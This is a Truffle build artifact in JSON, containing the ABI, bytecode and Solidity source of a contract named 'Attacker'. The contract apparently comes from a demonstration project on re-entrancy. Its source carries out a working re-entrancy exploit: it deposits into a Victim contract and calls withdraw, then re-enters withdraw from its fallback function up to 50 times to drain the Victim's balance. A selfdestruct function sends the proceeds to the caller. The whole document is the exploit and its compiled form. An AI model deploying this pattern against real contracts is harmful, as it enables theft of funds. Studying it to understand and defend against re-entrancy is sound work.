{
  "contractName": "Attacker",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "count",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_victim",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "_count",
          "type": "uint256"
        },
        {
          "indexed": false,
          "name": "_balance",
          "type": "uint256"
        }
      ],
      "name": "LogFallback",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "collect",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "kill",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6060604052341561000f57600080fd5b60405160208061042d83398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506103b28061007b6000396000f300606060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306661abd1461017257806341c0e1b51461019b578063930c2003146101b0578063e522538114610205575b7ff4159b37750c1f8102b811a1409a82c505fbd359fd52574d3523feca952764f16001543073ffffffffffffffffffffffffffffffffffffffff1631604051808381526020018281526020019250505060405180910390a160016000815480929190600101919050555060326001541015610170576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561015b57600080fd5b6102c65a03f1151561016c57600080fd5b5050505b005b341561017d57600080fd5b61018561020f565b6040518082815260200191505060405180910390f35b34156101a657600080fd5b6101ae610215565b005b34156101bb57600080fd5b6101c361022e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61020d610253565b005b60015481565b3373ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15156102d757600080fd5b6125ee5a03f115156102e857600080fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561037057600080fd5b6102c65a03f1151561038157600080fd5b5050505600a165627a7a7230582012dd239613e63f956dccb8b5c6701cbc436150910fffa799f2d82891a937a30e0029",
  "source": "pragma solidity ^0.4.18;\n\nimport \"./Victim.sol\";\n\ncontract Attacker {\n\n    Victim public victim;\n    uint public count;\n\n    event LogFallback(uint _count, uint _balance);\n\n    function Attacker(address _victim) public {\n        victim = Victim(_victim);\n    }\n\n    function collect() payable public {\n        victim.deposit.value(msg.value)();\n        victim.withdraw();\n    }\n\n    function kill() public {\n        selfdestruct(msg.sender);\n    }\n\n    function() payable public {\n        LogFallback(count, this.balance);\n        count++;\n        if (count < 50) {\n            victim.withdraw();\n        }\n    }\n}",
  "sourcePath": "/code/truffle/code/contracts/re-entrancy/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.19+commit.c4cbbb05.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2018-03-23T19:09:18.987Z"
}